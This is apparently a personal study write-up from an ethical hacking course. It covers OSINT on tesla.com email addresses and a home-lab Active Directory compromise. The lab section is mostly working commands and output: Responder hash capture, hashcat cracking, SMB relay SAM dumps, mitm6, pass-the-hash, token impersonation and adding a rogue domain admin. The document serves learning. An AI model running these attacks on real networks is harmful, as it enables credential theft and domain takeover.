# External Pentesting Main Concepts
#### People as the Weakest Link
Heath said, in the Practical Ethical Hacking course, during the Utilizing Social Media video, that people are always the weakest link, and that, "I get in, almost every external assessment, with a weak password like 'Fall19' or 'Winter2019'."
#### When Stuck, Go Back and Enumerate
"Enumerate, enumerate, enumerate." If you get to a point where you're running down a rabbit hole and you can't seem to find anything immediately vulnerable, or obviously exploitable, or you've been trying to get an exploit to work for more than 30 minutes, it's probably time to move on.

Don't waste your time banging your head against a wall. If you're stuck, you should probably go enumerate some more, whether you're outside *or* inside the environment.
## External Recon
### OSINT
my first priority, for now, when doing recon, is to figure out the naming convention of accounts so that i can try logging in later, either with breached credentials, or by guessing. 
this can be done by hunting for emails online, whether it be through hunter.io, phonebook.cz, or another service.
#### Discovering Email Addresses
##### hunter.io
1. looked up tesla.com
2. revealed result for Erin Chen, email: echen@tesla.com
	1. email syntax appears to be first initial, last name, @tesla[.]com
##### phonebook.cz or intelx.io
Phonebook is a super straightforward service for finding email addresses.
>intelx is a free service, and phonebook now requires SSO login from intelx
>> intelx isn't my favorite, i just tried use date restraints and specifically looking for emails for tesla.com and i didn't find anything of use, though that's not to say the service is useless.
##### LinkedIn
One you know the email address convention, you can search LinkedIn for public profiles of people who work at the target company.
#### Verifying Email Addresses
Verifying email addresses can be done using the following methods:
- [emailhippo](https://tools.emailhippo.com/): was able to successfully verify lstanicic@tesla.com without signing up or logging in
- [Email-Checker](https://email-checker.net/check): was about to successfully verify lstanicic@tesla.com without signing up or logging in
- [haveibeenpwned](https://haveibeenpwned.com/), this one's obvious.
- Clicking Forgot Password on a log-in portal
### Subdomain Enumeration
I think starting w/ Sublist3r and Assetfinder and piping their output through Httprobe is a great way to start and find things to enumerate manually *while* Amass is running.

I'm gonna list the tools in the order I liked using them against tesla[.]com.

But first, here's a one-liner that runs `httprobe` on the output of `sublist3r` and `assetfinder`: `sublist3r -d target.com > s.txt && assetfinder target.com > a.txt && cat s.txt a.txt | sort -u | httprobe`
##### [Sublist3r](https://github.com/aboul3la/Sublist3r)
Basic passive subdomain enumeration tool that uses **search engines and public APIs** to find subdomains. has barebones active scanning
>queries search engines and historical databases that may contain **archived/old subdomains** no longer in use
##### [Assetfinder](https://github.com/tomnomnom/assetfinder)
Basic passive(fast) subdomain enumeration tool that queries public data sources (certificate transparency logs, search engines, APIs) to find subdomains
>Focuses on **certificate transparency logs** - if a subdomain has a certificate, it's likely actively maintained
##### [Amass](https://github.com/owasp-amass/amass)
OWASP's comprehensive subdomain enumeration tool that performs both passive and active reconnaissance using 70+ data sources.

Here are some of my favorite commands to use w/ Amass:
- Discover target namespaces(root domains) for enumeration: `amass intel`
- Basic subdomain enumeration: `amass enum -d meow.com -whois -o amass.txt`
- Basic brute force subdomain enumeration: `amass enum -brute -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -d lookup.thm -o amass.txt`
- Good brute force subdomain enumeration: `amass enum -active -d owasp.org -brute -w /usr/share/wordlists/amass/deepmagic.com-top50kprefixes.txt -ip -o amass_results_owasp.txt`

[Amass Official User Guide](https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md)
##### Honorable Mention: [crt.sh](https://crt.sh/)
"Enter an **Identity** (Domain Name, Organization Name, etc),  
a **Certificate Fingerprint** (SHA-1 or SHA-256) or a **crt.sh ID**"
### Enumerating Web Technologies
##### [Builtwith](https://builtwith.com/)
A passive way to lookup what technologies a website is using.
##### Wappalyzer
A browser extension that enumerates technologies like Content Management Systems, Programming Languages, and Analytic technologies a website is running. Somewhat active, since you must navigate to the website directly, however it doesn't cause your web traffic to look anything out of the ordinary.
##### Whatweb
CLI tool built-in to Kali Linux that enumerates web technologies and website headers.

---
## Internal Recon
### Active Recon
1. ran nmap scan
```
# Nmap 7.95 scan initiated Mon Nov 10 09:48:35 2025 as: /usr/lib/nmap/nmap --privileged -sV -oN nmapDC.out -T5 -v 10.10.10.1
Increasing send delay for 10.10.10.1 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Warning: 10.10.10.1 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.1
Host is up (0.034s latency).
Not shown: 948 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
135/tcp   open     msrpc          Microsoft Windows RPC
445/tcp   open     microsoft-ds?
646/tcp   filtered ldp
981/tcp   filtered unknown
1036/tcp  filtered nsstp
1042/tcp  filtered afrog
1094/tcp  filtered rootd
1110/tcp  filtered nfsd-status
1183/tcp  filtered llsurfup-http
1309/tcp  filtered jtag-server
1583/tcp  filtered simbaexpress
1658/tcp  filtered sixnetudr
1761/tcp  filtered landesk-rc
1862/tcp  filtered mysql-cm-agent
2040/tcp  filtered lam
2042/tcp  filtered isis
2049/tcp  filtered nfs
2103/tcp  filtered zephyr-clt
2126/tcp  filtered pktcable-cops
2869/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
2910/tcp  filtered tdaccess
3071/tcp  filtered csd-mgmt-port
3323/tcp  filtered active-net
3370/tcp  filtered satvid-datalnk
3546/tcp  filtered unknown
3659/tcp  filtered apple-sasl
3826/tcp  filtered wormux
3880/tcp  filtered igrs
3918/tcp  filtered pktcablemmcops
4045/tcp  filtered lockd
4224/tcp  filtered xtell
5120/tcp  filtered barracuda-bbs
5500/tcp  filtered hotline
5999/tcp  filtered ncd-conf
6667/tcp  filtered irc
7911/tcp  filtered unknown
8080/tcp  open     daap           mt-daapd DAAP
8089/tcp  filtered unknown
8193/tcp  filtered sophos
8300/tcp  filtered tmi
8400/tcp  filtered cvd
8651/tcp  filtered unknown
9010/tcp  open     websocket      WebSocket++ 0.8.2
9415/tcp  filtered unknown
10617/tcp filtered unknown
32783/tcp filtered unknown
41511/tcp filtered unknown
49157/tcp filtered unknown
50006/tcp filtered unknown
54045/tcp filtered unknown
65129/tcp filtered unknown
65389/tcp filtered unknown
MAC Address: 52:55:0A:0A:0A:01 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 10 09:49:26 2025 -- 1 IP address (1 host up) scanned in 51.07 seconds
```
### Kerbrute - Validate Domain Users
A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

One can create a list of users by finding names online via OSINT(LinkedIn, Hunter.io), and been able to discern the email address convention(e.g. acunningham@cyberspace.local)

- Created the following `userlist.txt`
```
acunningham
smurphy
administrator
guest
meowmeow
miaomiao
bbygirl
daethyra
```
- Ran Kerbrute against the domain controller:
```
./kerbrute userenum -d cyberspace.local --dc 10.10.10.4 userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/20/25 - Ronnie Flathers @ropnop

2025/12/20 20:20:50 >  Using KDC(s):
2025/12/20 20:20:50 >   10.10.10.4:88

2025/12/20 20:20:50 >  [+] VALID USERNAME:       acunningham@cyberspace.local
2025/12/20 20:20:50 >  [+] VALID USERNAME:       administrator@cyberspace.local
2025/12/20 20:20:50 >  [+] VALID USERNAME:       smurphy@cyberspace.local
2025/12/20 20:20:50 >  [+] VALID USERNAME:       miaomiao@cyberspace.local
2025/12/20 20:20:50 >  Done! Tested 9 usernames (4 valid) in 0.009 seconds
```
## Attacking
### Responder Hash Capturing
2. ran responder and got administrator hash when workstation1 logged in. important to note that i only know it was workstation1 because i'm the one who facilitated the login. there's no output that necessarily specifies that workstation1 logged in.
```
[+] Listening for events...                                                                               

[*] [NBT-NS] Poisoned answer sent to 10.10.10.5 for name CYBERSPACE-DC (service: File Server)
[*] [MDNS] Poisoned answer sent to 10.10.10.5      for name CYBERSPACE-DC.local
[*] [MDNS] Poisoned answer sent to fe80::7bae:522:7d14:d1c for name CYBERSPACE-DC.local
[*] [MDNS] Poisoned answer sent to 10.10.10.5      for name CYBERSPACE-DC.local
[*] [MDNS] Poisoned answer sent to fe80::7bae:522:7d14:d1c for name CYBERSPACE-DC.local
[*] [LLMNR]  Poisoned answer sent to 10.10.10.5 for name CYBERSPACE-DC
[*] [LLMNR]  Poisoned answer sent to fe80::7bae:522:7d14:d1c for name CYBERSPACE-DC
[*] [LLMNR]  Poisoned answer sent to 10.10.10.5 for name CYBERSPACE-DC
[*] [LLMNR]  Poisoned answer sent to fe80::7bae:522:7d14:d1c for name CYBERSPACE-DC
[SMB] NTLMv2-SSP Client   : fe80::7bae:522:7d14:d1c
[SMB] NTLMv2-SSP Username : CYBERSPACE\administrator
[SMB] NTLMv2-SSP Hash     : administrator::CYBERSPACE:7e26d5b465d4c894:4C3C5EC5C0DB581D31DA382804A41A36:0101000000000000006088A32A52DC01727A7B39B839918F0000000002000800370041005200330001001E00570049004E002D005A0047004A004600370058003400370053003400550004003400570049004E002D005A0047004A00460037005800340037005300340055002E0037004100520033002E004C004F00430041004C000300140037004100520033002E004C004F00430041004C000500140037004100520033002E004C004F00430041004C0007000800006088A32A52DC0106000400020000000800300030000000000000000100000000200000922336A5A3755F79623400F55F605CFA2D32D37CBDCBE009E45187E2DDDC70790A001000000000000000000000000000000000000900240063006900660073002F0043005900420045005200530050004100430045002D00440043000000000000000000
```

3. ran `hashcat -m 5600 workstation1-adminhash.txt /usr/share/wordlists/rockyou.txt`
```
ADMINISTRATOR::CYBERSPACE:7e26d5b465d4c894:4c3c5ec5c0db581d31da382804a41a36:0101000000000000006088a32a52dc01727a7b39b839918f0000000002000800370041005200330001001e00570049004e002d005a0047004a004600370058003400370053003400550004003400570049004e002d005a0047004a00460037005800340037005300340055002e0037004100520033002e004c004f00430041004c000300140037004100520033002e004c004f00430041004c000500140037004100520033002e004c004f00430041004c0007000800006088a32a52dc0106000400020000000800300030000000000000000100000000200000922336a5a3755f79623400f55f605cfa2d32d37cbdcbe009e45187e2dddc70790a001000000000000000000000000000000000000900240063006900660073002f0043005900420045005200530050004100430045002d00440043000000000000000000:P@$$w0rd!
```

4. ran responder again and mimicked activity for ACunningham machine using ACunningham user, typed `10.10.10.7`(my kali machine's IP) into the File Explorer's URL bar and got ACunningham's hash:
```
[SMB] NTLMv2-SSP Client   : 10.10.10.5
[SMB] NTLMv2-SSP Username : CYBERSPACE\acunningham
[SMB] NTLMv2-SSP Hash     : acunningham::CYBERSPACE:09da74768c713a7c:921BFA83EE798CB728EB4AF27343E0E3:010100000000000000213487EC53DC019C3EA4C393B7209F000000000200080039004E005900390001001E00570049004E002D004E00380038003100320033005800430046003900360004003400570049004E002D004E0038003800310032003300580043004600390036002E0039004E00590039002E004C004F00430041004C000300140039004E00590039002E004C004F00430041004C000500140039004E00590039002E004C004F00430041004C000700080000213487EC53DC01060004000200000008003000300000000000000001000000002000000F7717B1DA649007E18793503EEBADE0A15072091D174A09CE0952BA535EA3550A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310030002E0037000000000000000000
```

5. ran `hashcat -m 5600 acunningham-NTLMV2.txt /usr/share/wordlists/rockyou.txt`
```
ACUNNINGHAM::CYBERSPACE:09da74768c713a7c:921bfa83ee798cb728eb4af27343e0e3:010100000000000000213487ec53dc019c3ea4c393b7209f000000000200080039004e005900390001001e00570049004e002d004e00380038003100320033005800430046003900360004003400570049004e002d004e0038003800310032003300580043004600390036002e0039004e00590039002e004c004f00430041004c000300140039004e00590039002e004c004f00430041004c000500140039004e00590039002e004c004f00430041004c000700080000213487ec53dc01060004000200000008003000300000000000000001000000002000000f7717b1da649007e18793503eebade0a15072091d174a09ce0952ba535ea3550a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310030002e0037000000000000000000:Password12345
```

> when cracking hashes, you can use rulesets that mutate password lists to help pwn
>> `hashcat -m 5600 hashes.txt rockyou.txt -r OneRule`
>>> https://github.com/stealthsploit/OneRuleToRuleThemStill

### SMB Relay
6.  checked for SMB signing requirement, `nmap --script=smb2-security-mode.nse -p 445 10.10.10.1`
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 52:55:0A:0A:0A:01 (Unknown)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

7. set up for and ran relay attacks
	1. got targets using `arp-scan`
	2. saved targets to targets.txt
	3. initialized NTLMrelay, `ntlmrelayx.py -tf targets.txt -smb2support`
	4. initialized responder, `sudo responder -I eth0 -dw`
	5. simulated event by forcing explorer.exe navigation to attacker machine, captured SAM hashes
```
# FIRST RAN IT ON SMURPHY: ###

[*] SMBD-Thread-3: Received connection from 10.10.10.6, attacking target smb://10.10.10.6
[-] Authenticating against smb://10.10.10.6 as CYBERSPACE\smurphy FAILED
[*] SMBD-Thread-4: Received connection from 10.10.10.6, attacking target smb://10.10.10.5
[*] Authenticating against smb://10.10.10.5 as CYBERSPACE\smurphy SUCCEED
[*] SMBD-Thread-6: Received connection from 10.10.10.6, attacking target smb://10.10.10.1
[-] Authenticating against smb://10.10.10.1 as CYBERSPACE\smurphy FAILED
[*] SMBD-Thread-7: Received connection from 10.10.10.6, attacking target smb://10.10.10.6
[-] Authenticating against smb://10.10.10.6 as CYBERSPACE\smurphy FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29cb493105dfdbb0c9abae5009cbd69f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3f345522654e41a657fdbdd9324b283b:::
Alt Cunningham:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 10.10.10.5

# THEN I RAN IT ON ACUNNINGHAM: ###

[*] Target system bootKey: 0xa1a79c5c4b998767df411d1e107f4744
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6e9a00438f1da0e358bb8f2542888a98:::
Spider Murphy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 10.10.10.6
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
> note for NTLMv1 hashes, when cracking you likely only need the NT part, the second half, and when passing the hash you'll probs need the full thing

### Shells w/ psexec
8. ran `msfconsole` and used psexec to log in to acunningham using cracked password(Password12345) and then also logged in as local administrator account using dumped SAM hash
9. then ran `psexec.py` to login as local administrator using dumped SAM hash.
> note that if `psexec.py` is blocked, you should try `wmiexec.py` and `smbexec.py`
>> `wmiexec.py administrator@10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`

### IPv6 takeover w/ mitm6
8. since i know the Domain Controller is at 10.10.10.4, I can use `mitm6` to take over ipv6
> ran `ntlmrelayx.py -6 -t ldaps://10.10.10.4 -wh wpad.cyberspace.local -l mitm6loot`
> then ran `sudo mitm6 -d cyberspace.local`
> simulated workstation reboot by restarting acunningham, which got a bunch of loot
> simulated workstation login on acunningham and smurphy, and i only saw one account get created:
```
[*] Adding new user with username: ytICxzWiOU and password: b'zv"=iR9>38[C" result: OK

```

### Cracking NTLMv1
11. cracked local ACUNNINGHAM's local administrator password:
```
hashcat -m 1000 7facdc498ed1680c4fd1448319a8c04f /usr/share/wordlists/rockyou.txt --show
7facdc498ed1680c4fd1448319a8c04f:Password1!
```

12. able to PWN acunningham (AD user) and local administrator on ACUNNINGHAM machine using WMI:
```
┌──(kali㉿kali)-[~/Desktop/cyberspace]
└─$ nxc wmi 10.10.10.5 -u acunningham -p Password12345 -d CYBERSPACE.local
RPC         10.10.10.5      135    ACUNNINGHAM      [*] Windows 10 / Server 2019 Build 19041 (name:ACUNNINGHAM) (domain:CYBERSPACE.local)
RPC         10.10.10.5      135    ACUNNINGHAM      [-] Check admin error: dcom initialization failed with stringbinding: "ncacn_ip_tcp:10.10.10.5[49667]", please try "--rpc-timeout" option. (probably is admin)
RPC         10.10.10.5      135    ACUNNINGHAM      [+] CYBERSPACE.local\acunningham:Password12345 

┌──(kali㉿kali)-[~/Desktop/cyberspace]
└─$ nxc wmi 10.10.10.5 -u administrator -p Password1! --local-auth        
RPC         10.10.10.5      135    ACUNNINGHAM      [*] Windows 10 / Server 2019 Build 19041 (name:ACUNNINGHAM) (domain:CYBERSPACE.local)
RPC         10.10.10.5      135    ACUNNINGHAM      [-] Check admin error: dcom initialization failed with stringbinding: "ncacn_ip_tcp:10.10.10.5[49667]", please try "--rpc-timeout" option. (probably is admin)
RPC         10.10.10.5      135    ACUNNINGHAM      [+] ACUNNINGHAM\administrator:Password1!
```

13. able to PWN acunningham on DC and all workstations via SMB:
```
┌──(kali㉿kali)-[~/Desktop/cyberspace]
└─$ nxc smb 10.10.10.0/24 -u acunningham -p "Password12345" -d CYBERSPACE.local
CYBERSPACE.local\acunningham:Password12345 STATUS_LOGON_FAILURE
SMB         10.10.10.6      445    SMURPHY          [*] Windows 10 / Server 2019 Build 19041 x64 (name:SMURPHY) (domain:CYBERSPACE.local) (signing:False) (SMBv1:None)
SMB         10.10.10.4      445    CYBERSPACE-DC    [*] Windows Server 2022 Build 20348 x64 (name:CYBERSPACE-DC) (domain:CYBERSPACE.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.5      445    ACUNNINGHAM      [*] Windows 10 / Server 2019 Build 19041 x64 (name:ACUNNINGHAM) (domain:CYBERSPACE.local) (signing:False) (SMBv1:None)
SMB         10.10.10.6      445    SMURPHY          [+] CYBERSPACE.local\acunningham:Password12345 (Pwn3d!)
SMB         10.10.10.4      445    CYBERSPACE-DC    [+] CYBERSPACE.local\acunningham:Password12345 (Pwn3d!)
SMB         10.10.10.5      445    ACUNNINGHAM      [+] CYBERSPACE.local\acunningham:Password12345 (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

14. checked for local administrator password reuse across network, via SMB:
```
┌──(kali㉿kali)-[~/Desktop/cyberspace]
└─$ nxc smb 10.10.10.0/24 -u administrator -p Password1! --local-auth                  
SMB         10.10.10.5      445    ACUNNINGHAM      [*] Windows 10 / Server 2019 Build 19041 x64 (name:ACUNNINGHAM) (domain:ACUNNINGHAM) (signing:False) (SMBv1:None)
SMB         10.10.10.6      445    SMURPHY          [*] Windows 10 / Server 2019 Build 19041 x64 (name:SMURPHY) (domain:SMURPHY) (signing:False) (SMBv1:None)
SMB         10.10.10.4      445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:None)
SMB         10.10.10.5      445    ACUNNINGHAM      [+] ACUNNINGHAM\administrator:Password1! (Pwn3d!)
SMB         10.10.10.6      445    SMURPHY          [+] SMURPHY\administrator:Password1! (Pwn3d!)
SMB         10.10.10.4      445    NONE             [-] \administrator:Password1! STATUS_LOGON_FAILURE 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

15. able to relay NTLMv1 local administrator hash found in SAM dump, via SMB:
```
┌──(kali㉿kali)-[~/Desktop/cyberspace]
└─$ nxc smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         10.10.10.4      445    CYBERSPACE-DC    [*] Windows Server 2022 Build 20348 x64 (name:CYBERSPACE-DC) (domain:CYBERSPACE-DC) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.4      445    CYBERSPACE-DC    [-] CYBERSPACE-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE
SMB         10.10.10.6      445    SMURPHY          [*] Windows 10 / Server 2019 Build 19041 x64 (name:SMURPHY) (domain:SMURPHY) (signing:False) (SMBv1:None)
SMB         10.10.10.5      445    ACUNNINGHAM      [*] Windows 10 / Server 2019 Build 19041 x64 (name:ACUNNINGHAM) (domain:ACUNNINGHAM) (signing:False) (SMBv1:None)
SMB         10.10.10.6      445    SMURPHY          [+] SMURPHY\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         10.10.10.5      445    ACUNNINGHAM      [+] ACUNNINGHAM\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
## Post Compromise

### Token Impersonation
#### Using Msfconsole (psexec, incognito module)
1. got shell via `windows/smb/psexec`
2. used `load incognito`
3. ensured users on workstation were logged in, then used `list_tokens -u` to see tokens available for delegation
4. used `impersonate_token CYBERSPACE\\acunningham` to impersonate acunningham
5. used `impersonate_token CYBERSPACE\\administrator` to impersonate active directory administrator account
6. created new user account via `net user /add miaomiao Password21@ /domain` for persistence
7. added miaomiao to domain administrators group via `net group "Domain Admins" miaomiao /ADD /DOMAIN`